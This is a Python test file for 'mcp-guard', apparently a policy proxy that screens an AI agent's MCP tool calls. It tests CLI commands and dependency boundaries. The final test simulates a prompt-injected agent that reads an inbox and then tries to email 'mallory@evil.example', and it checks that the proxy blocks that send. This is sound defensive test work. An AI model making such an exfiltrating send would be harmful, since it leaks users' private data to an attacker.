"""The `mcp-guard` command (pyproject console script) and the dependency boundaries.

- `mcp-guard init` and `mcp-guard proxy` work from the installed command (skipped when it isn't installed, e.g.
  a plain checkout without `pip install -e .`; CI installs it).
- The core (guard, policy, provenance, init) needs neither AgentDojo nor the MCP SDK, and the proxy doesn't need
  AgentDojo: imports are run in a fresh interpreter with those packages made unimportable.
"""
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).parent
SRC = str(HERE.parent / "src")
TOY = str(HERE / "toy_mcp_server.py")
POLICY = str(HERE / "fixtures" / "toy_policy.yaml")
INSTALLED = shutil.which("mcp-guard")
needs_install = pytest.mark.skipif(INSTALLED is None, reason="mcp-guard not installed (pip install -e .)")


def run(cmd, **kw):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=120, **kw)
    except OSError as e:
        # Windows Application Control (WDAC) on the dev laptop refuses pip's unsigned mcp-guard.exe launcher
        # (WinError 4551). That's this machine's policy, not the package: CI runs these on clean runners.
        if getattr(e, "winerror", None) == 4551:
            pytest.skip("Windows Application Control blocked the mcp-guard.exe launcher on this machine")
        raise


def _app_control_blocked(e: BaseException) -> bool:
    """True if e (or anything inside an exception group / its causes) is WinError 4551."""
    if getattr(e, "winerror", None) == 4551:
        return True
    inner = [*getattr(e, "exceptions", []), e.__cause__, e.__context__]
    return any(x is not None and x is not e and _app_control_blocked(x) for x in inner)


def py_without(blocked: list[str], code: str):
    """Run `code` in a fresh interpreter where the `blocked` packages cannot be imported."""
    prelude = "import sys\n" + "".join(f"sys.modules[{name!r}] = None\n" for name in blocked)
    env = {**os.environ, "PYTHONPATH": SRC}
    return run([sys.executable, "-c", prelude + code], env=env)


def test_core_needs_neither_agentdojo_nor_mcp(tmp_path):
    tools = tmp_path / "tools.json"
    tools.write_text(json.dumps({"tools": [{"name": "send_email"}]}))
    out = tmp_path / "p.yaml"
    r = py_without(["agentdojo", "mcp", "openai"], f"""
import mcp_guard.guard, mcp_guard.policy, mcp_guard.provenance, mcp_guard.init_policy
from mcp_guard.cli import main
sys.exit(main(["init", {str(tools)!r}, "-o", {str(out)!r}]))
""")
    assert r.returncode == 0, r.stderr
    assert "unknown_tools: block" in out.read_text()


def test_proxy_needs_no_agentdojo():
    pytest.importorskip("mcp")
    r = py_without(["agentdojo", "openai"], "import mcp_guard.proxy, mcp_guard.proxy.__main__")
    assert r.returncode == 0, r.stderr


def test_proxy_without_the_sdk_says_how_to_install_it():
    r = py_without(["mcp"], "from mcp_guard.cli import main\nsys.exit(main(['proxy', '--help']))")
    assert r.returncode != 0 and "pip install" in (r.stderr + r.stdout) and "proxy" in (r.stderr + r.stdout)


def test_cli_module_help_lists_both_subcommands():
    r = run([sys.executable, "-m", "mcp_guard.cli", "--help"], env={**os.environ, "PYTHONPATH": SRC})
    assert r.returncode == 0 and "init" in r.stdout and "proxy" in r.stdout


def test_console_script_entry_point_is_registered():
    """pip writes the mcp-guard launcher from this entry point; loading it must give cli.main."""
    from importlib.metadata import PackageNotFoundError, entry_points, version
    try:
        version("mcp-guard")
    except PackageNotFoundError:
        pytest.skip("mcp-guard not installed (pip install -e .)")
    (ep,) = [e for e in entry_points(group="console_scripts") if e.name == "mcp-guard"]
    assert ep.value == "mcp_guard.cli:main"
    from mcp_guard.cli import main
    assert ep.load() is main


@needs_install
def test_installed_command_help():
    r = run([INSTALLED, "--help"])
    assert r.returncode == 0 and "init" in r.stdout and "proxy" in r.stdout
    r = run([INSTALLED, "proxy", "--help"])
    assert r.returncode == 0 and "--user-request-file" in r.stdout
    r = run([INSTALLED, "init", "--help"])
    assert r.returncode == 0 and "--output" in r.stdout


@needs_install
def test_installed_command_init_writes_a_blocking_skeleton(tmp_path):
    tools = tmp_path / "tools.json"
    tools.write_text(json.dumps({"tools": [{"name": "read_inbox"}, {"name": "send_email"}]}))
    r = run([INSTALLED, "init", str(tools), "-o", str(tmp_path / "policy.yaml")])
    assert r.returncode == 0, r.stderr
    text = (tmp_path / "policy.yaml").read_text()
    assert "unknown_tools: block" in text and "send_email" in text


@needs_install
def test_installed_command_proxy_blocks_the_poisoned_send(tmp_path):
    """client -> `mcp-guard proxy` -> toy server, all real processes."""
    pytest.importorskip("mcp")
    import anyio
    from mcp import Client, StdioServerParameters

    req = tmp_path / "request.txt"
    req.write_text("Summarize my inbox", encoding="utf-8")
    calls_log = tmp_path / "server_calls.jsonl"
    env = {**os.environ, "TOY_CALL_LOG": str(calls_log)}
    args = ["proxy", "--policy", POLICY, "--user-request-file", str(req), "--confirm", "none", "--",
            sys.executable, TOY]

    async def main():
        async with Client(StdioServerParameters(command=INSTALLED, args=args, env=env), cache=None) as agent:
            await agent.call_tool("read_inbox", {})
            return await agent.call_tool("send_email", {"recipients": ["mallory@evil.example"],
                                                        "subject": "x", "body": "y"})

    try:
        sent = anyio.run(main)
    except BaseException as e:          # the SDK spawns the launcher; its OSError may come wrapped in a group
        if _app_control_blocked(e):
            pytest.skip("Windows Application Control blocked the mcp-guard.exe launcher on this machine")
        raise
    assert sent.is_error
    ran = [json.loads(l)["tool"] for l in calls_log.read_text().splitlines()]
    assert ran == ["read_inbox"]
